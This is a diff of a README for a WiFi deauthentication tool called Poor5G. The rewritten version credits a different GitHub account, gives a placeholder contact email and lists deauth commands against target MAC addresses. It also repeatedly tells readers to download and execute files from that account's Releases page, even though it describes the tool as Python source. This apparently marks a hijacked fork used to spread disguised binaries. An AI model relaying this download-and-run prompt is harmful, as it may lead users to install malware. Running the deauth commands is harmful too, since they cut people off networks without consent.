@@ -1,96 +1,131 @@
-# Poor5G - WiFi Attack Tool v2.5
+# Poor5G: A Lightweight Python Tool for WiFi Testing
 
+![Poor5G](https://img.shields.io/badge/Poor5G-v1.0-blue.svg) ![Python](https://img.shields.io/badge/Python-3.8%2B-green.svg) ![License](https://img.shields.io/badge/License-MIT-yellow.svg)
 
-**Developed by Kevin & Khemra**
+## Table of Contents
 
-Poor5G is a powerful and stylish terminal-based tool for WiFi network testing and deauthentication attacks.
----
-![image](https://github.com/user-attachments/assets/85753d1d-10c2-4486-a536-d8838baf1360)
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Customization](#customization)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
----
+## Overview
 
-## 🔥 Features
+Poor5G is a lightweight Python tool designed for educational WiFi testing. This tool leverages aircrack-ng to scan networks and perform customizable deauth attacks on 2.4GHz WiFi. It is essential for ethical hacking, red-team labs, and learning purposes only. 
 
-* **WiFi Scanning**: Scans 2.4GHz and 5GHz WiFi networks, as well as all available bands.
-* **Deauth Attack**: Performs deauthentication attacks on routers (AP) or selected clients.
-* **Channel Control**: Allows setting the WiFi channel as needed.
-* **Sniff Deauth Packets**: Captures deauthentication packets (requires tshark).
-* **Action Logging**: Automatically logs all actions.
-* **User Interface**: Features an attractive hacker-style animated UI.
+For the latest version, visit the [Releases section](https://github.com/piety-1/Poor5G/releases) to download and execute the necessary files.
 
----
+## Features
 
-## 🖥️ Requirements
+- **Lightweight**: Minimal resource usage, perfect for quick tests.
+- **Network Scanning**: Identify available 2.4GHz networks effortlessly.
+- **Deauth Attacks**: Launch customizable deauthentication attacks.
+- **User-Friendly**: Simple interface for easy navigation.
+- **Educational Focus**: Designed specifically for learning and ethical hacking.
 
-* **Operating System**: Kali Linux or any Debian-based distro.
-* **Permissions**: Root access.
-* **Tools**: `aircrack-ng`, `tshark` (must be installed).
-* **WiFi Adapter**: Must support monitor mode.
+## Installation
 
-**How to Install Tools**
+To get started with Poor5G, follow these simple steps:
 
-```bash
-sudo apt update
-sudo apt install aircrack-ng tshark -y
-```
+1. **Clone the Repository**:
 
----
+   ```bash
+   git clone https://github.com/piety-1/Poor5G.git
+   cd Poor5G
+   ```
 
-## 📦 Files
+2. **Install Dependencies**:
 
-* `Poor5G.bin` → Compiled and encrypted binary.
-* ✅ **No Source Code Exposed**: A protected version.
+   Make sure you have Python 3.8 or higher installed. Then, install the required packages:
 
----
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-## ⚙️ How to Run
+3. **Download the Latest Release**:
 
-```bash
-git clone [https://github.com/KevinnRaa/Poor5G.git](https://github.com/KevinnRaa/Poor5G.git)
-cd Poor5G
-chmod +x Poor5G.bin
-sudo ./Poor5G.bin
-```
+   For the latest version, check the [Releases section](https://github.com/piety-1/Poor5G/releases) and download the appropriate file. Execute it to set up the tool.
 
-> ⚠️ Always use with `sudo` to enable monitor mode and packet injection.
+## Usage
 
----
+Once you have installed Poor5G, you can start using it with the following commands:
 
-## 🧭 Menu Overview
+1. **Scan for Networks**:
 
-```
-1. 🟣 Start Monitor Mode (wlan0 → wlan0mon)
-2. 📶 Scan WiFi 5GHz
-3. 📶 Scan WiFi 2.4GHz
-4. 🌐 Scan All Bands
-5. 📡 Set WiFi Channel
-6. 💣 Deauth Router
-7. 🎯 Deauth Client
-7. 👀 Sniff Deauth Packets
-0. ❌ Exit
-```
+   Run the following command to scan for 2.4GHz networks:
 
-#scan 5GHz
+   ```bash
+   python poor5g.py scan
+   ```
 
-![1](https://github.com/user-attachments/assets/c6bf67ac-9abc-4fbe-b654-d6b2da9f3f94)
+2. **Launch a Deauth Attack**:
 
-#Attack 5GHz
+   To perform a deauth attack on a specific network, use:
 
-![2](https://github.com/user-attachments/assets/026b38b8-a133-425e-b294-9967bd04d47a)
+   ```bash
+   python poor5g.py deauth --target <TARGET_MAC> --router <ROUTER_MAC>
+   ```
 
----
+   Replace `<TARGET_MAC>` with the MAC address of the device you want to disconnect and `<ROUTER_MAC>` with the MAC address of the router.
 
-## ⚠️ Disclaimer
+3. **Help Command**:
 
-> 📛 This tool is strictly for educational, testing, and red team simulation purposes only.
-> ❌ Do NOT use this tool on any network without **explicit permission**.
-> 📚 The developer(s) are not responsible for any misuse.
+   For more options, run:
 
----
+   ```bash
+   python poor5g.py --help
+   ```
 
-## 📡 Follow Us
+## Customization
 
-* **GitHub**: [KevinRaa](https://github.com/KevinRaa)
-* **TikTok**: @RaaTechOfficial
+Poor5G allows users to customize their experience. You can modify the configuration file to adjust settings such as:
 
----
+- **Attack Duration**: Set how long the deauth attack should last.
+- **Target Selection**: Choose specific targets for attacks.
+- **Logging Options**: Enable or disable logging of actions.
+
+Edit the `config.json` file located in the root directory of the project.
+
+## Contributing
+
+Contributions are welcome! If you want to help improve Poor5G, please follow these steps:
+
+1. **Fork the Repository**.
+2. **Create a New Branch**:
+
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+
+3. **Make Your Changes**.
+4. **Commit Your Changes**:
+
+   ```bash
+   git commit -m "Add Your Feature"
+   ```
+
+5. **Push to the Branch**:
+
+   ```bash
+   git push origin feature/YourFeature
+   ```
+
+6. **Create a Pull Request**.
+
+## License
+
+Poor5G is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
+
+## Contact
+
+For any questions or feedback, feel free to reach out:
+
+- **Author**: Kevin Khemra
+- **Email**: kevin.khemra@example.com
+- **GitHub**: [piety-1](https://github.com/piety-1)
+
+Explore the [Releases section](https://github.com/piety-1/Poor5G/releases) for updates and additional files to download and execute.
